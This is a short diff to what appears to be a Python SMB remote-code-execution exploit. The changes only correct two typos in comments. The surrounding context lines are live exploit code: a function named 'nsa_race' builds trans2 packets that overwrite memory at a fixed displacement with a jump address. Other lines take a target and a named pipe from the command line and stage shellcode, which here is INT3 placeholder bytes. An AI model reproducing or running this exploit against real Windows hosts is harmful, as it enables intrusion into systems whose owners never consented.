@@ -24,7 +24,7 @@ target = sys.argv[1]
 pipe_name = sys.argv[2]
 
 # this one must do something to restore execution
-# Note: when stagine shellcode is executed, CONNECTION+0x3d0 is at top of stack
+# Note: when staging shellcode is executed, CONNECTION+0x3d0 is at top of stack
 staging_sc = '\xcc'*128
 
 def login_put_staging_sc(conn, staging_sc, maxBufferSize):
@@ -111,7 +111,7 @@ def nsa_race(conn, jmp_addr):
 	mid = conn.next_mid()
 	# we will overwrite 8 bytes at displacement 312, so data must be at least 320 bytes
 	req1 = conn.create_trans2_packet(setup, param=param, data='A'*324, mid=mid)
-	# chnage infoLevel to SMB_INFO_IS_NAME_VALID
+	# change infoLevel to SMB_INFO_IS_NAME_VALID
 	req2 = conn.create_trans2_secondary_packet(mid, param=pack('<H', 6))
 	req3 = conn.create_trans2_secondary_packet(mid, data=pack('<Q', jmp_addr), dataDisplacement=312)
 
